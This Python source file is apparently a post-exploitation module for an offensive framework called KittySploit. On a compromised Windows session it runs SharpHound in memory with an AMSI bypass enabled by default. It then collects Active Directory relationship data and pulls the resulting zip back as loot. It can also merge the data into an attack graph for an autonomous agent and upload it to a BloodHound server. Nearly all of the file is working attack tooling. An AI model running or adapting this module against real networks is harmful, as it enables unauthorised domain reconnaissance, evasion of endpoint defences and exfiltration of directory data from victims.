#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Collect SharpHound output via loadmodule and wire BloodHound import path."""

from kittysploit import *

import os
import time
from pathlib import Path

from lib.post.windows.hash_loot import default_loot_dir
from lib.post.windows.loadmodule_helper import run_catalog_assembly
from lib.post.windows.session import WindowsSessionMixin


class Module(Post, WindowsSessionMixin):
    __info__ = {
        "name": "SharpHound Collect (optional external)",
        "description": (
            "OPTIONAL: requires SharpHound.exe in data/assemblies/. Prefer native "
            "LDAP/GPO modules (scanner/ldap/*, post/ldap/gather/*) for AD mapping. "
            "When you need a full CE-style zip: loadmodule SharpHound, pull loot, "
            "set bloodhound_export_path, merge into attack_graph, optional BHCE upload."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL, SessionType.POLLING],
        "references": [
            "https://github.com/SpecterOps/SharpHound",
            "https://bloodhound.specterops.io/",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "file_read"],
            "expected_requests": 6,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals"],
            "cost": 2.2,
            "noise": 0.85,
            "value": 0.7,
            "requires": {"capabilities_any": ["shell"], "capabilities_all": []},
            "chain": {
                "consumes_capabilities": ["shell"],
                "produces_capabilities": ["ad_graph"],
            },
        },
    }

    arguments = OptString(
        "-c All --zipfilename ks_bh.zip --outputdirectory C:\\Windows\\Temp",
        "SharpHound CLI arguments",
        False,
    )
    remote_zip = OptString(
        r"C:\Windows\Temp\ks_bh.zip",
        "Expected remote zip path to download after collection",
        False,
    )
    assembly = OptString("SharpHound", "Catalog name or path for SharpHound.exe", False)
    bypass_amsi = OptBool(True, "AMSI bypass before loadmodule", False)
    pull_loot = OptBool(True, "Download zip to output/loot/", False)
    set_export_path = OptBool(True, "Set agent KB bloodhound_export_path to local zip", False)
    import_graph = OptBool(True, "Merge into attack_graph after pull", False)
    bhce_url = OptString("", "Optional BHCE base URL to upload zip", False)
    bhce_token = OptString("", "Optional BHCE API token", False)
    bhce_token_id = OptString("", "Optional BHCE token id", False)

    def run(self):
        if not self.win_require_windows():
            return False
        if not self.win_require_powershell():
            return False

        args = str(self.arguments or "").strip()
        remote_zip = str(self.remote_zip or r"C:\Windows\Temp\ks_bh.zip").strip()
        print_status(f"loadmodule {self.assembly} — {args}")
        try:
            out = run_catalog_assembly(
                self,
                str(self.assembly or "SharpHound"),
                arguments=args,
                bypass_amsi=bool(self.bypass_amsi),
            )
        except FileNotFoundError as exc:
            raise ProcedureError(
                FailureType.NotFound,
                f"{exc}. Drop SharpHound.exe into data/assemblies/ "
                "(SpecterOps SharpHound).",
            ) from exc
        except Exception as exc:
            raise ProcedureError(FailureType.Unknown, f"SharpHound failed: {exc}") from exc

        if out:
            print_info(out[:4000])

        # Give SharpHound a moment to flush zip
        time.sleep(2)
        local_path = None
        if self.pull_loot:
            if not self.win_remote_file_exists(remote_zip):
                # Try to find newest zip in Temp
                listing = self.win_run_powershell(
                    r"Get-ChildItem $env:TEMP -Filter *.zip | Sort-Object LastWriteTime -Descending | "
                    r"Select-Object -First 3 -ExpandProperty FullName",
                    timeout=20,
                )
                print_warning(f"Expected zip missing: {remote_zip}")
                if listing:
                    print_info(f"Temp zips:\n{listing}")
                    first = listing.strip().splitlines()[0].strip()
                    if first.lower().endswith(".zip"):
                        remote_zip = first
                        print_status(f"Using {remote_zip}")
            loot_dir = default_loot_dir()
            local_path = str(loot_dir / f"sharphound_{int(time.time())}.zip")
            print_status(f"Downloading {remote_zip} -> {local_path}")
            if not self.win_pull_file_via_session(remote_zip, local_path):
                raise ProcedureError(
                    FailureType.Unknown,
                    "Failed to download SharpHound zip. Check remote_zip / arguments.",
                )
            print_success(f"Loot saved: {local_path}")

        kb = self._agent_kb()
        if local_path and self.set_export_path and kb is not None:
            kb["bloodhound_export_path"] = local_path
            print_success(f"bloodhound_export_path = {local_path}")

        if local_path and self.import_graph:
            try:
                from lib.protocols.ldap.ad_graph_import import merge_bloodhound_into_kb

                target_kb = kb if kb is not None else {}
                added = merge_bloodhound_into_kb(target_kb, local_path)
                if kb is not None and "bloodhound_graph" not in kb:
                    # stash overlay snapshot for sync
                    from lib.protocols.ldap.ad_graph_import import (
                        bloodhound_to_attack_graph,
                        load_bloodhound_export,
                    )

                    n, e = load_bloodhound_export(local_path)
                    kb["bloodhound_graph"] = bloodhound_to_attack_graph(n, e)
                print_success(f"Imported BloodHound graph (+{added} nodes)")
            except Exception as exc:
                print_warning(f"Local graph import partial/failed: {exc}")

        bhce_url = str(self.bhce_url or "").strip()
        if local_path and bhce_url:
            try:
                from lib.protocols.ldap.bhce_client import BHCEClient, BHCEConfig

                client = BHCEClient(
                    BHCEConfig(
                        base_url=bhce_url,
                        token_id=str(self.bhce_token_id or ""),
                        token_key=str(self.bhce_token or ""),
                    )
                )
                ver = client.version()
                print_info(f"BHCE version: {ver}")
                result = client.upload_file(local_path)
                print_success(f"BHCE upload response: {result}")
            except Exception as exc:
                print_warning(f"BHCE upload skipped/failed: {exc}")

        return True

    def _agent_kb(self):
        if not getattr(self, "framework", None):
            return None
        state = getattr(self.framework, "agent_state", None)
        if state and isinstance(getattr(state, "knowledge_base", None), dict):
            return state.knowledge_base
        return None
